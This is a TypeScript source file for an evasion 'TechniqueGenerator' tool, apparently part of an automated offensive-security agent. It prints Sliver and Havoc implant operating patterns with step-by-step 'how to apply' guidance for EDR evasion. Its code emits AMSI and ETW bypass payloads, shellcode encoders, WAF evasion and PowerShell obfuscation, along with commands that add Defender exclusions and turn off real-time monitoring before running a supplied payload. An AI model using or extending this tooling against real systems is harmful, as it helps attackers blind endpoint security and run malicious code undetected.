  return `## Sliver Operational Patterns (from runner/runner.go + taskrunner/ analysis)

Sliver follows a specific operational sequence that differs from Havoc.

### Sliver's Execution Order:
1. **Check Execution Limits** → ExecLimits() at startup
   - Hostname, username, domain-joined, datetime, file-existence, locale
   - If any limit fails → os.Exit(1) immediately
   - This is the FIRST thing the implant does

2. **Connect to C2** → StartConnectionLoop() or StartBeaconLoop()
   - C2Generator selects next URL based on strategy (random/sequential)
   - For HTTP: Age key exchange → ChaCha20-Poly1305 session
   - For mTLS: Certificate auth → yamux multiplexing
   - For DNS: Base32 encoding, INIT with Age key exchange

3. **Register with Server** → registerSliver()
   - Sends hostname, username, OS, arch, PID, UUID
   - Server creates session/beacon record

4. **Receive Tasks** → sessionMainLoop() or beaconMainLoop()
   - Tasks dispatched to handlers via envelope system
   - Windows tasks wrapped in WrapperHandler (token impersonation)

5. **Execute Task** → Handler-specific logic
   - AMSI/ETW bypass: patchAmsi() / patchEtw() (0xC3 RET patch)
   - Process injection: refresh() → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
   - Assembly execution: InProc (CLR hosting) or Fork-and-Run (Donut + inject)

6. **Return Results** → connection.Send or pendingResults channel

### Key Differences from Havoc:
| Havoc | Sliver |
|-------|--------|
| Indirect syscalls | RefreshPE (disk-based unhook) |
| Hardware breakpoint AMSI bypass | 0xC3 memory patch AMSI bypass |
| Single execution mode | Dual mode (in-process + fork-and-run) |
| C2 handled by framework | Multi-transport abstraction (HTTP/DNS/WG/mTLS) |
| N/A | Traffic encoder polymorphism |
| N/A | Extension system (memmod + WASM + BOF) |

### How to apply:
- For Windows EDR: RefreshPE → AMSI patch → ETW patch → payload
- For network stealth: use polymorphic HTTP encoding
- For .NET tasks: choose in-process (stealth) vs fork-and-run (safety)
- For modular operations: load extensions on-demand (don't compile everything)
- For targeting: use execution limits to scope implant to specific hosts/users`
}

// ── Tool implementation ────────────────────────────────────────────────────

interface TechniqueGeneratorInput {
  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class TechniqueGeneratorTool implements Tool {
  name = 'TechniqueGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'TechniqueGenerator',
      description: `Generate evasion-aware payload variants for authorized security assessments.

## Techniques
- amsi_bypass: PowerShell AMSI bypass (reflection patch / string obfuscation / env vars)
- etw_bypass: ETW logging bypass (reflection patch / registry)
- shellcode_encode: Shellcode encoding (XOR/Base64/Hex + decoder stub)
- waf_evasion: WAF bypass (chunked encoding / parameter pollution / Unicode)
- obfuscated_ps: PowerShell obfuscation (base64/IEX/string splitting)
- havoc_strategy: Return Havoc-derived evasion strategy principles
- sliver_strategy: Return Sliver-derived evasion strategy principles (RefreshPE, SGN, traffic encoding, etc.)
- refresh_pe: DLL unhooking by reloading .text section from disk (Sliver approach)
- sgn_encoding: Shikata-Ga-Nai polymorphic shellcode encoding
- traffic_encoder: HTTP traffic encoder polymorphism
- pe_donor: PE metadata spoofing from legitimate binaries
- dotnet_dual: Dual-mode .NET execution guidance (in-process CLR vs fork-and-run)
- go_template: Go template conditional compilation principles
- custom: Custom bypass technique`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'custom'],
            description: 'Evasion technique type',
          },
          payload: { type: 'string', description: 'Original payload/command/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          analysis_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: 'Detected WAF type' },
              edr: { type: 'string', description: 'Detected EDR type' },
              sandbox: { type: 'boolean', description: 'Whether in sandbox environment' },
            },
            description: 'EnvAnalyzer detection results',
          },
          encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: 'Encoding method (valid for shellcode_encode)' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, analysis_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, analysis_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, analysis_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'havoc_strategy':
        output = [
          havocOperationalPattern(),
          '',
          havocEvasionCompilerFlags(),
          '',
          indirectSyscallStrategy(),
          '',
          hardwareBypassStrategy(),
          '',
          sleepObfuscationStrategy(),
          '',
          stackSpoofingStrategy(),
          '',
          hashApiResolution(),
        ].join('\n')
        break
      case 'sliver_strategy':
        output = [
          sliverOperationalPattern(),
          '',
          refreshPE(),
          '',
          sgnEncoding(),
          '',
          trafficEncoderPattern(),
          '',
          peDonorSpoofing(),
          '',
          dualModeDotNet(),
          '',
          goTemplateCompilation(),
        ].join('\n')
        break
      case 'refresh_pe':
        output = refreshPE()
        break
      case 'sgn_encoding':
        output = sgnEncoding()
        break
      case 'traffic_encoder':
        output = trafficEncoderPattern()
        break
      case 'pe_donor':
        output = peDonorSpoofing()
        break
      case 'dotnet_dual':
        output = dualModeDotNet()
        break
      case 'go_template':
        output = goTemplateCompilation()
        break
      case 'custom':
        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy)`
        break
      default:
        return { content: `Unknown technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] AMSI Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('Havoc uses hardware breakpoints (Dr0-Dr3 + VEH) instead of memory patching.')
    lines.push('Memory patching is detectable because EDRs hook NtProtectVirtualMemory.')
    lines.push('Hardware breakpoints are CPU registers — no memory modification at all.')
    lines.push('')
    lines.push('For PowerShell (where hardware breakpoints are not directly accessible),')
    lines.push('use reflection-based bypass as the most practical alternative.')
    lines.push('')

    if (edrType?.includes('CrowdStrike')) {
      lines.push(`## CrowdStrike Falcon Environment`)
      lines.push(`CrowdStrike monitors PowerShell execution closely. Recommended approach:`)
      lines.push('')
      lines.push('# Method 1: Reflection patch (recommended for PS)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Method 2: Execute AMSI bypass first, then payload')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push(`# Then execute original payload:`)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push(`## Windows Defender Environment`)
      lines.push('')
      lines.push('# Method 1: Add exclusion path (requires admin)')
      lines.push(`  Add-MpPreference -ExclusionPath "C:\\temp"`)
      lines.push('')
      lines.push('# Method 2: Disable real-time monitoring (requires admin)')
      lines.push(`  Set-MpPreference -DisableRealtimeMonitoring $true`)
      lines.push('')
      lines.push('# Method 3: Reflection patch (no admin needed, recommended)')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push('')
      lines.push('# Method 4: String obfuscation (bypasses static detection)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Then execute original payload:')
      lines.push(payload)
    } else {
      // Generic AMSI bypass
      lines.push(`## Generic AMSI Bypass (${edrType || 'unknown EDR'})`)
      lines.push('')

      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### Method ${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }

      lines.push('## Usage')
      lines.push('1. Execute AMSI bypass first (choose one method)')
      lines.push('2. Then execute original payload')
      lines.push('')
      lines.push(`Original payload: ${payload}`)
    }

    return lines.join('\n')
  }

  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] ETW Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('ETW (Event Tracing for Windows) logs PowerShell execution for EDR monitoring.')
    lines.push('Havoc disables ETW via reflection on the PSEtwLogProvider internal fields.')
    lines.push('The alternative — registry method — requires admin but is more persistent.')
    lines.push('')

    lines.push(`## ETW Bypass (${edrType || 'unknown EDR'})`)
    lines.push('ETW is used by EDRs to monitor PowerShell execution. Bypassing ETW')
    lines.push('prevents execution logging. Combine with AMSI bypass for full coverage.')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### Method ${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push('## Usage')
    lines.push('1. Execute ETW bypass first')
    lines.push('2. Then execute original payload (recommend AMSI bypass too)')
    lines.push('')
    lines.push(`Original payload: ${payload}`)

    return lines.join('\n')
  }
}
